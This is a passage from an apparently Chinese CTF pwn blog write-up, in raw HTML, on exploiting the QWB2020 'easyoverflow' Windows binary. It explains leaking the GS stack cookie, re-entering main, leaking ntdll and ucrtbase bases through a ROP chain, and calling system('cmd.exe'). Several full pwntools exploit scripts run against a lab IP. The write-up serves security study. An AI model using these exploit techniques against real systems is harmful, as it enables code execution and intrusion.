class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary==&gt;&#x27;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">10</span>)</span><br><span class="line">dll_base=<span class="number">0x76D6BDFB</span>-<span class="number">0x7BDFB</span></span><br><span class="line">system_addr=dll_base+<span class="number">0x44700</span></span><br><span class="line">cmd_addr=dll_base+<span class="number">0x048C8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x64</span>+p32(canary)+p32(<span class="number">0</span>)*<span class="number">2</span>+p32(<span class="number">0xdeadbeef</span>)+p32(system_addr)+p32(<span class="number">0x11223344</span>)+p32(cmd_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±ç›´æ¥æ¢­å“ˆæ‹¿ä¸‹äº†â€¦ğŸ˜</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240324001017015.png" alt="image-20240324001017015"></p>
<h2 id="å¼ºç½‘æ¯2020-easyoverflow"><a href="#å¼ºç½‘æ¯2020-easyoverflow" class="headerlink" title="å¼ºç½‘æ¯2020_easyoverflow"></a>å¼ºç½‘æ¯2020_easyoverflow</h2><p><a target="_blank" rel="noopener" href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip">é¢˜ç›®ä¸‹è½½é“¾æ¥</a></p>
<h3 id="ä»£ç åˆ†æ-1"><a href="#ä»£ç åˆ†æ-1" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0</span>i64);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0</span>i64);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0</span>i64);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;buffer:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_acrt_iob_func(0)</code> ä¼šè¿”å›æ ‡å‡†è¾“å…¥æµ <code>stdin</code> çš„æŒ‡é’ˆï¼Œ<code>setbuf</code> ä¼šè®¾ç½®è¾“å…¥æµä¸ºæ— ç¼“å†²æ¨¡å¼ã€‚ä¹‹åæœ‰ä¸‰æ¬¡å¾ªç¯ï¼Œæ¯æ¬¡å¾ªç¯éƒ½å¯ä»¥æº¢å‡ºå¹¶ä¸” <code>puts</code> ç›´æ¥è¾“å‡ºäº† <code>DstBuf</code> ï¼Œå¯ä»¥å°†ä¸€äº›æ ˆä¸­æ•°æ®ç»™é¡ºå¸¦æ‰“å°å‡ºæ¥ã€‚</p>
<p>å¼€å¯äº† <code>GS</code> ä¿æŠ¤ï¼Œä¸‹é¢æ˜¯ <code>StackCookie</code> åœ¨å½“å‰æ ˆå¸§çš„ç”Ÿæˆä»¥åŠå‡½æ•°è¿”å›å‰çš„æ£€æŸ¥ä»£ç ã€‚é¦–å…ˆå°† <code>__security_cookie</code> ï¼ˆä½äº <code>.data</code> æ®µï¼‰èµ‹å€¼ç»™ <code>rax</code> ï¼Œç„¶åæ‹¿è¯¥å€¼å’Œ <code>rsp</code> è¿›è¡Œå¼‚æˆ–å¹¶å†™å…¥ <code>rsp+138h+var_18</code> çš„ä½ç½®ï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿æ¯ä¸ªæ ˆå¸§ä¸­å­˜æ”¾çš„ <code>StackCookie</code> ä¸ä¸€æ ·ï¼Œé¿å…æ”»å‡»è€…æ³„éœ²äº†ä¸€æ¬¡ <code>StackCookie</code> åå¯ä»¥å®Œå…¨ç»•è¿‡ <code>GS</code>ã€‚åœ¨æ£€æŸ¥æ—¶ä¼šå–å‡º <code>rsp+138h+var_18</code> å­˜æ”¾çš„ <code>StackCookie</code> å¼‚æˆ– <code>rsp</code> å’Œ <code>__security_cookie</code> è¿›è¡Œæ¯”è¾ƒï¼ˆåœ¨ <code>__security_check_cookie</code> å‡½æ•°ä¸­å®Œæˆï¼‰ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001000                 push    rbx</span><br><span class="line">.text:0000000140001002                 sub     rsp, 130h</span><br><span class="line">.text:0000000140001009                 mov     rax, cs:__security_cookie</span><br><span class="line">.text:0000000140001010                 xor     rax, rsp</span><br><span class="line">.text:0000000140001013                 mov     [rsp+138h+var_18], rax</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">.text:00000001400010B2                 mov     rcx, [rsp+138h+var_18]</span><br><span class="line">.text:00000001400010BA                 xor     rcx, rsp        ; StackCookie</span><br><span class="line">.text:00000001400010BD                 call    __security_check_cookie</span><br><span class="line">.text:00000001400010C2                 add     rsp, 130h</span><br><span class="line">.text:00000001400010C9                 pop     rbx</span><br><span class="line">.text:00000001400010CA                 retn</span><br></pre></td></tr></table></figure>



<p>å°†æ–­ç‚¹ä¸‹åˆ°åç§» <code>0x140001094</code> å¤„ï¼ŒæŸ¥çœ‹ <code>.data</code> æ®µä¸Šçš„ <code>__security_cookie</code> ä¸ <code>RSP</code> å¼‚æˆ–å¾—åˆ°çš„ç»“æœæ­£å¥½æ˜¯æ ˆé‡Œå­˜æ”¾çš„ <code>StackCookie</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325102510607.png" alt="image-20240325102510607"></p>
<p>æ­¤æ—¶å¡«å…… <code>(0x118-0x18)</code> ä¸ªåƒåœ¾å­—ç¬¦ï¼Œæ­£å¥½åˆ° <code>StackCookie</code> ï¼Œ<code>puts</code> å‡½æ•°å°±èƒ½æŠŠå®ƒç»™å¸¦å‡ºæ¥ï¼ˆç¨‹åºé‡æ–°è¿è¡Œï¼Œ<code>StackCookie</code> å·²æ”¹å˜ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240325110649724.png" alt="image-20240325110649724"></p>
<h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p>å› ä¸º <code>windows 64</code> ä½ä¸‹çš„ä¼ å‚æ–¹å¼ä¸æ˜¯ç”¨æ ˆå®ç°çš„ï¼Œå¦‚æœå¯ä»¥ç›´æ¥æ³„éœ²å‡º <code>ucrtbase.dll</code> åŸºåœ°å€ï¼Œæ‹¿åˆ° <code>system</code> å‡½æ•°å’Œ <code>cmd.exe</code> å­—ç¬¦ä¸²åœ°å€å°±å¯ä»¥æ‹¿åˆ° <code>shell</code>ã€‚åœ¨ <code>64</code> ä½ä¸‹ï¼Œå‚æ•°çš„ä¼ é€’æ˜¯é€šè¿‡ <code>rcx\rdx\r8\r9</code> å¯„å­˜å™¨å®ç°çš„ã€‚ä¸ºäº†æ§åˆ¶å‚æ•°å°±å¾—å»å¯»æ‰¾ <code>gadget</code> è¿›è¡Œ <code>ROP</code> ï¼Œæˆ‘é¦–å…ˆæƒ³åˆ°èƒ½ä¸èƒ½ç”¨ä¸Šé¢å¸¦å‡ºæ¥ <code>StackCookie</code> çš„æ–¹å¼ï¼ŒæŠŠæ ˆé‡Œçš„ <code>ucrtbase.dll</code> ä¸­çš„æŒ‡é’ˆç»™å¸¦å‡ºæ¥ï¼Œè¿™æ ·ç”¨è¯¥ <code>dll</code> ä¸­çš„ <code>gadget</code> å’Œå‡½æ•°åœ°å€å¯ä»¥ä¸€æ¬¡æ€§å®Œæˆ <code>system(&quot;cmd.exe&quot;)</code> çš„æ‰§è¡Œã€‚ç»è¿‡è°ƒè¯•ï¼Œå‘ç°æ ˆä¸­æœ‰ <code>stackoverflow.exe</code> <code>kernel32.dll</code> <code>ntdll.dll</code> çš„æŒ‡é’ˆï¼Œä½†å”¯ç‹¬æ²¡æœ‰ <code>ucrtbase.dll</code> çš„æŒ‡é’ˆã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328111721770.png" alt="image-20240328111721770"></p>
<p>è¿™å°±æ„å‘³éœ€è¦ä¸»åŠ¨ <code>rop</code> æ¥æ³„éœ² <code>ucrtbase.dll</code> ä¸­åœ°å€ï¼Œåœ¨ <code>windows</code> ä¸­çš„ <code>IAT</code> ï¼ˆ<strong>å¯¼å…¥åœ°å€æ•°ç»„</strong>  <strong>Import Address Table</strong>ï¼‰ç±»ä¼¼äº <code>Linux</code> ä¸­çš„ <code>GOT</code> è¡¨ï¼Œé‡Œé¢éƒ½å­˜æ”¾äº†å‡½æ•°çš„çœŸå®åœ°å€ã€‚è¦æ³„éœ² <code>IAT</code> ä¸­çš„æ•°æ®éœ€è¦æ‹¿åˆ°ç¨‹åºåŸºåœ°å€ï¼Œä½†æœç´¢ <code>gadget</code> å´å‘ç°åœ¨ <code>stackoverflow.exe</code> æ–‡ä»¶ä¸­æ²¡æœ‰ <code>pop rcx ; ret</code> çš„ <code>gadget</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328125151982.png" alt="image-20240328125151982"></p>
<p>çœ‹ <strong>z1r0</strong> å’Œ <strong>Vergissmeinnicht</strong> å¸ˆå‚…çš„æ–‡ç« ä¸­éƒ½æåˆ°å» <code>ntdll.dll</code> ä¸­å¯»æ‰¾æ›´å¤šçš„ <code>gadget</code> ï¼Œæˆ‘è§‰å¾—ä»–ä»¬æåˆ°çš„åŸå› ä¸æ˜¯æœ€å…³é”®çš„ã€‚æˆ‘è®¤ä¸ºä¹‹æ‰€ä»¥ç”¨ <code>ntdll.dll</code> ä¸­çš„ <code>gadget</code> å°±å•çº¯å› ä¸ºå®ƒå­˜åœ¨äºæ ˆä¸­ï¼Œå¯ä»¥è¢«é¡ºå¸¦æ‰“å°å‡ºæ¥ï¼Œå¹¶ä¸”å…¶ä¸­å­˜åœ¨ <code>pop rcx ; ret</code> çš„ <code>gadget</code> ã€‚è€Œ <code>kernel32.dll</code> ä¸­æ²¡æœ‰ <code>pop rcx ; ret</code> æ‰€ä»¥ä¸è€ƒè™‘æ³„éœ²å®ƒçš„åœ°å€ã€‚</p>
<p>è¡¥å……ï¼šæˆ‘æ‰¾ä¸åˆ°è¿™é“é¢˜çš„è¿œç¨‹ç¯å¢ƒï¼Œä½†æˆ‘ä¾ç„¶æŠŠä»–å½“åšæ”»å‡»è¿œç¨‹æ¥åšã€‚å› ä¸º [å…³äº Windows ä¸‹çš„ ASLR æœºåˆ¶](å…³äº Windows ä¸‹çš„ ASLR æœºåˆ¶) ä¸­æåˆ°å•çº¯æ‰“æœ¬åœ°çš„è¯ï¼Œè¿™äº›æ¨¡å—åœ°å€éƒ½æ˜¯å›ºå®šçš„ï¼Œå‹æ ¹ä¸éœ€è¦æ¯æ¬¡æ³„éœ²ï¼ˆæ‰“è¿œç¨‹å…¶å®ä¹Ÿä¸éœ€è¦æ¯æ¬¡æ³„éœ²ï¼Œåªè¦æ³„éœ²ä¸€æ¬¡æ¨¡å—åŸºåœ°å€å°±å¯ä»¥ï¼‰ï¼Œä¸è¿‡ç¡®å®æ˜¯æ²¡æœ‰ç¯å¢ƒï¼Œå°±æ²¡æœ‰æ¢é¢˜ç›®ç»™çš„ <code>dll</code> ï¼ˆå¥½å§ï¼Œå…¶å®æ˜¯æˆ‘ç°åœ¨è¿˜ä¸çŸ¥é“æ€ä¹ˆæ¢ğŸ˜¶â€ğŸŒ«ï¸ï¼‰</p>
<p>æ¥ä¸‹æ¥ç¼–å†™å¸¸è§„çš„ <code>exp</code> æ¥æ³„éœ²ä¸Šé¢æåˆ°çš„åœ°å€</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x188</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x188</span>)</span><br><span class="line">ntdll_dll=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_dll ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_dll))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328131533313.png" alt="image-20240328131533313"></p>
<p>ä½†è¿™ä¹ˆå†™æ˜¯é”™è¯¯çš„ï¼Œå› ä¸ºç¨‹åºåªæœ‰ä¸‰æ¬¡è¾“å…¥å’Œè¾“å‡ºçš„æœºä¼šã€‚è¿™æ ·æŠŠä¸‰æ¬¡æœºä¼šéƒ½æ‹¿æ¥æ³„éœ²ï¼Œå¯æœ€åæ²¡æœ‰è¾“å…¥çš„æœºä¼šï¼Œç¨‹åºå°±ä¼šç›´æ¥ç»“æŸã€‚å› æ­¤ <code>ntdll.dll</code> æš‚æ—¶å…ˆä¸æ³„éœ²ï¼Œåœ¨æ³„éœ²å‡ºç¨‹åºåŸºåœ°å€åï¼Œå…ˆåŠ«æŒè¿”å›åœ°å€é‡æ–°å›åˆ° <code>main</code> å‡½æ•°ã€‚è¿™æ ·åˆæ‹¿åˆ°äº†ä¸‰æ¬¡è¾“å…¥å’Œè¾“å‡ºçš„æœºä¼šï¼ŒåŒæ—¶éœ€è¦æ³¨æ„ï¼Œå› ä¸ºå†æ¬¡å›åˆ° <code>main</code> å‡½æ•°ï¼Œå½“å‰æ ˆå¸§ä¼šæ”¹å˜ï¼Œ<code>rsp</code> çš„å€¼æ”¹å˜åä¼šå½±å“ <code>StackCookie</code> çš„å€¼ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡åˆ° <code>main</code> å‡½æ•°æ—¶ï¼Œè¿˜éœ€è¦é‡æ–°æ³„éœ² <code>StackCookie</code></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>



<p>ä¸Šé¢çš„ <code>exp</code> æ‰§è¡Œåï¼Œç»è¿‡è°ƒè¯•æ˜¯å¯ä»¥å†æ¬¡å›åˆ° <code>main</code> å‡½æ•°ä¸Šçš„ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144547951.png" alt="image-20240328144547951"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328144611047.png" alt="image-20240328144611047"></p>
<p>æ¥ä¸‹æ¥æ˜¯æ³„éœ²æ–°çš„ <code>StackCookie</code> å’Œ <code>ntdll.dll</code> åŸºåœ°å€ï¼Œå¹¶ä¸”é€šè¿‡ <code>ROP</code> æ³„éœ²å‡º <code>ucrtbase.dll</code> åŸºåœ°å€ã€‚<code>exp</code> å¦‚ä¸‹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">first_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;first&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(first_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(first_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ntdll.dll</span></span><br><span class="line"><span class="string">0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base</span></span><br><span class="line"><span class="string">00000001400010A6     call    cs:puts</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">second_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;second&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(second_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x180</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">ntdll_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x526b1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ntdll_base ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ntdll_base))</span><br><span class="line"></span><br><span class="line">pop_rbx_ret=<span class="number">0x137d</span>+ntdll_base</span><br><span class="line">pop_rcx_ret=<span class="number">0x1a853</span>+ntdll_base</span><br><span class="line">call_puts=<span class="number">0x10a6</span>+base_addr</span><br><span class="line">puts_got=<span class="number">0x2180</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(second_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(pop_rbx_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rcx_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(call_puts)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ucrtbase ==&gt; &#x27;</span>,<span class="built_in">hex</span>(ucrtbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>ä¸‹é¢æ˜¯è·³è½¬è‡³ <code>ROP</code> é“¾ä¸­çš„ <code>pop rbx ; ret</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328154129097.png" alt="image-20240328154129097"></p>
<p>ä¸‹å›¾æ˜¯ <code>exp</code> æ‰§è¡Œåæ³„éœ²å‡ºäº†æ‰€æœ‰åœ°å€çš„æƒ…å†µï¼Œå¹¶ä¸”å¯ä»¥è¿˜æœ‰ä¸€æ¬¡è¾“å…¥çš„æœºä¼š</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240328155055711.png" alt="image-20240328155055711"></p>
<p>ç°åœ¨å¯ä»¥å†™å‡ºå¦‚ä¸‹ <code>exp</code> ï¼Œå®Œæˆ <code>system(&quot;cmd.exe&quot;)</code> çš„è°ƒç”¨</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&quot;192.168.0.104&quot;</span>,<span class="number">6666</span>)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>-<span class="number">0x18</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">first_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;first&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(first_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x118</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>)</span><br><span class="line">base_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12f4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_addr ==&gt; &#x27;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"></span><br><span class="line">main_addr=base_addr+<span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(first_stack_cookie)</span><br><span class="line">payload+=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ntdll.dll</span></span><br><span class="line"><span class="string">0x000000018000137d : pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000018001a853 : pop rcx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base</span></span><br><span class="line"><span class="string">00000001400010A6     call    cs:puts</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">second_stack_cookie=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;second&gt;&gt; stack_cookie ==&gt; &#x27;</span>,<span class="built_in">hex</span>(second_stack_cookie))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x180</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;input:\r\n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span 